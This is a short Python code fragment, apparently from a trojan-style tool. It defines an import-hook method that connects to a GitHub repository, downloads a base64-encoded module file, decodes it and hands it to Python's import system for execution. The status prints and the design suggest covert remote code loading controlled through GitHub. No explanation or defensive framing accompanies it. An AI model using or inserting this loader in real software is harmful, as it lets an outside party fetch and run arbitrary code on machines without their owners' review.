def find_spec(self, fullname, path, target=None):
    print(f"[*] Attempting to retrieve {fullname}")
    self.repo = github_connect()  # Connect to the GitHub repository
    try:
        # Retrieve the module code from the 'modules' directory
        new_library = get_file_contents('modules', f'{fullname}.py', self.repo)
        if new_library is not None:
            # Decode the module code from base64
            self.current_module_code = base64.b64decode(new_library)
            return importlib.util.spec_from_loader(fullname, loader=self)
    except github3.exceptions.NotFoundError:
        print(f"[*] Module {fullname} not found in repository.")
        return None  # Return None if the module is not found
